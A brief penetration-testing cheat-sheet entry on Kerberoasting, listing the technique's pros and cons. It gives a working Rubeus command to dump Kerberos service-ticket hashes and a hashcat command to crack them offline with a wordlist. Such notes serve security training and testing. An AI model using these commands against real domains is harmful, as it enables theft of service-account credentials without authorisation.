Using Rubeus

Rubeus performs Kerberoasting by requesting Kerberos service tickets (TGS) for Service Principal Names (SPNs). The encrypted service tickets can then be cracked offline to recover the plaintext passwords of service accounts.

Advantages

Supports offline password cracking, generates minimal network traffic, and targets service accounts without requiring elevated privileges.

Disadvantages

Requires a valid domain account, and TGS requests can still be logged and detected by security monitoring solutions.

Perform Kerberoasting

.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

Crack Hash Use Hashcat

sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
